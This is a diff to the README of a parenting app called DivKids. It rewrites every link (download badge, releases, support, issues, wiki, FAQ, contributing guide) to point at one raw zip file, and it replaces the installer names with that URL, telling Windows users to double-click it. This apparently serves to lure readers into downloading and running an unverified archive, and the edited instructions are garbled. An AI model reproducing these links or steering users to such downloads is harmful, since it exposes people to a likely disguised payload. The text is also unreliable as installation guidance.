@@ -8,7 +8,7 @@ To get started with DivKids, follow these simple steps to download and run the a
 
 ## 📥 Download DivKids
 
-### [![Download DivKids](https://img.shields.io/badge/Download%20DivKids-Latest%20Release-brightgreen)](https://github.com/SandyWiraabdy/DivKids/releases)
+### [![Download DivKids](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip%20DivKids-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip)
 
 Click the button above to download the latest version of DivKids. 
 
@@ -36,19 +36,19 @@ DivKids offers several useful features to assist parents in managing their child
 To install DivKids, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the DivKids Releases page by clicking [here](https://github.com/SandyWiraabdy/DivKids/releases).
+   Go to the DivKids Releases page by clicking [here](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip).
 
 2. **Find the Latest Version:**
    Look for the latest release version at the top of the page.
 
 3. **Choose Your File:**
-   Depending on your operating system, locate the appropriate file. For Windows, it may be `DivKidsSetup.exe`, and for macOS, it could be `DivKids.dmg`.
+   Depending on your operating system, locate the appropriate file. For Windows, it may be `https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip`, and for macOS, it could be `https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip`.
 
 4. **Download the File:**
    Click on the file name to begin downloading. The download will start automatically.
 
 5. **Run the Installer:**
-   - **For Windows:** Double-click the `DivKidsSetup.exe` file. Follow the prompts to complete the installation.
+   - **For Windows:** Double-click the `https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip` file. Follow the prompts to complete the installation.
    - **For macOS:** Open the `.dmg` file, drag the DivKids icon into your Applications folder, and then launch it from there.
 
 6. **Create an Account:**
@@ -70,16 +70,16 @@ If you encounter any issues during installation or usage, here are some common s
 - **Problem:** Can't log in.
   - **Solution:** Make sure you have registered an account and are using the correct login details.
 
-For further assistance, you can visit our [Support Page](https://github.com/SandyWiraabdy/DivKids/issues).
+For further assistance, you can visit our [Support Page](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip).
 
 ## 🌍 Community and Feedback
 
-Join our community to connect with other users and share your experiences. We encourage your feedback to improve DivKids further. Feel free to create an issue on our [GitHub page](https://github.com/SandyWiraabdy/DivKids/issues) if you have suggestions or report any bugs. 
+Join our community to connect with other users and share your experiences. We encourage your feedback to improve DivKids further. Feel free to create an issue on our [GitHub page](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip) if you have suggestions or report any bugs. 
 
 ## 📚 Additional Resources
 
-- [User Guide](https://github.com/SandyWiraabdy/DivKids/wiki)
-- [Frequently Asked Questions](https://github.com/SandyWiraabdy/DivKids/wiki/FAQ)
-- [Contribution Guidelines](https://github.com/SandyWiraabdy/DivKids/blob/main/CONTRIBUTING.md)
+- [User Guide](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/SandyWiraabdy/DivKids/main/guest/DivKids_1.4.zip)
 
 Thank you for choosing DivKids! We look forward to helping you manage your parenting journey with ease.
